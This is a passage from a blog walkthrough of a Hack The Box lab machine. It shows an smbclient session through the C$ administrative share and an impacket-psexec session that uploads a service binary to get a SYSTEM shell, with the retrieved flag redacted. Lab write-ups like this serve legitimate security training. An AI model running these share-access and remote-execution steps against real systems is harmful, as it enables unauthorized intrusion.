</span></span><span class=line><span class=cl>  Documents and Settings          DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:17:12 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  pagefile.sys                      AHS <span class=m>738197504</span>  Wed May <span class=m>10</span> 22:05:32 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  PerfLogs                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:00 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Program Files                      DR        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:04:24 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Program Files <span class=o>(</span>x86<span class=o>)</span>                 D        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:03:38 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ProgramData                        DH        <span class=m>0</span>  Tue Sep <span class=m>13</span> 17:27:53 <span class=m>2022</span>
</span></span><span class=line><span class=cl>  Recovery                         DHSn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:17:15 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  System Volume Information         DHS        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:34:04 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Users                              DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Windows                             D        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:05:23 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>3774463</span> blocks of size 4096. <span class=m>1156502</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> <span class=nb>cd</span> Users
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                 DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Administrator                       D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  All Users                       DHSrn        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:28:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Default                           DHR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:17:12 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Default User                    DHSrn        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:28:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  desktop.ini                       AHS      <span class=m>174</span>  Sat Sep <span class=m>15</span> 08:16:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Public                             DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>3774463</span> blocks of size 4096. <span class=m>1156502</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\&gt;</span> <span class=nb>cd</span> Administrator
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  3D Objects                         DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  AppData                            DH        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Application Data                DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Contacts                           DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Cookies                         DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Desktop                            DR        <span class=m>0</span>  Thu Apr <span class=m>22</span> 08:16:03 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Documents                          DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Downloads                          DR        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 18:44:36 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Favorites                          DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Links                              DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Local Settings                  DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Music                              DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  My Documents                    DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  NetHood                         DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  NTUSER.DAT                        AHn   <span class=m>786432</span>  Tue Sep <span class=m>13</span> 17:29:05 <span class=m>2022</span>
</span></span><span class=line><span class=cl>  ntuser.dat.LOG1                   AHS    <span class=m>65536</span>  Wed Apr <span class=m>21</span> 16:23:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ntuser.dat.LOG2                   AHS   <span class=m>238592</span>  Wed Apr <span class=m>21</span> 16:23:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  NTUSER.DAT<span class=o>{</span>1c3790b4-b8ad-11e8-aa21-e41d2d101530<span class=o>}</span>.TM.blf    AHS    <span class=m>65536</span>  Wed Apr <span class=m>21</span> 10:03:39 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  NTUSER.DAT<span class=o>{</span>1c3790b4-b8ad-11e8-aa21-e41d2d101530<span class=o>}</span>.TMContainer00000000000000000001.regtrans-ms    AHS   <span class=m>524288</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  NTUSER.DAT<span class=o>{</span>1c3790b4-b8ad-11e8-aa21-e41d2d101530<span class=o>}</span>.TMContainer00000000000000000002.regtrans-ms    AHS   <span class=m>524288</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ntuser.ini                         HS       <span class=m>20</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Pictures                           DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  PrintHood                       DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Recent                          DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Saved Games                        DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Searches                           DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  SendTo                          DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Start Menu                      DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Templates                       DHSrn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:19 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Videos                             DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:31 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>3774463</span> blocks of size 4096. <span class=m>1156502</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\&gt;</span> <span class=nb>cd</span> Desktop
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Thu Apr <span class=m>22</span> 08:16:03 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                 DR        <span class=m>0</span>  Thu Apr <span class=m>22</span> 08:16:03 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  desktop.ini                       AHS      <span class=m>282</span>  Wed Apr <span class=m>21</span> 16:23:32 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  flag.txt                            A       <span class=m>32</span>  Fri Apr <span class=m>23</span> 10:39:00 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>3774463</span> blocks of size 4096. <span class=m>1156502</span> blocks available             
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> <span class=nb>pwd</span>
</span></span><span class=line><span class=cl>Current directory is <span class=se>\\</span>10.129.118.218<span class=se>\C</span>$<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> get flag.txt
</span></span><span class=line><span class=cl>getting file <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\f</span>lag.txt of size <span class=m>32</span> as flag.txt <span class=o>(</span>0.7 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0.7 KiloBytes/sec<span class=o>)</span>
</span></span><span class=line><span class=cl>smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>$</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>Which Administrative share is accessible on the box that allows users to view the whole file system?</em></p><p>The answer should be quite simple since we used the same exact <strong>share</strong> in TASK5 to download our <strong>flag</strong> file.</p><blockquote><p>C$</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What command can we use to download the files we find on the SMB Share?</em></p><p>Again, we used the same command to download the <strong>flag</strong> file in TASK5.</p><blockquote><p>get</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?</em></p><p>Optionally, we could use <em><strong>impacket's</strong></em> <em><strong>psecec</strong></em> tool to <strong>spawn</strong> a shell in the <em>ADMIN$</em> <strong>share</strong>. Then <strong>accessing</strong> the <strong>flag</strong> after we located it becomes quite simple.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-psexec administrator@<span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright <span class=m>2022</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.129.118.218.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file qbvrkWIQ.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.129.118.218.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service UNVK on 10.129.118.218.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service UNVK.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.107<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;cd ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows&gt;cd <span class=se>\U</span>sers<span class=se>\ </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers&gt;cd Administrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt;cd Desktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is EEE0-FCDB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>04/22/2021  12:16 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>04/22/2021  12:16 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>04/23/2021  02:39 AM                <span class=m>32</span> flag.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>32</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   4,736,704,512 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type flag.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><blockquote><p>psexec.py</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Simply grabbing the downloaded <strong>flag</strong> file from TASK5 should do it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat flag.txt 
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Optionally, we could use <em><strong>impacket's</strong></em> <em><strong>psecec</strong></em> tool as we did in TASK8.</p><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/tactics/>tactics</a></li><li><a href=https://bluewalle.github.io/tags/tier-1/>tier-1</a></li><li><a href=https://bluewalle.github.io/tags/vip-tier/>vip-tier</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/smb/>smb</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/misconfiguration/>misconfiguration</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>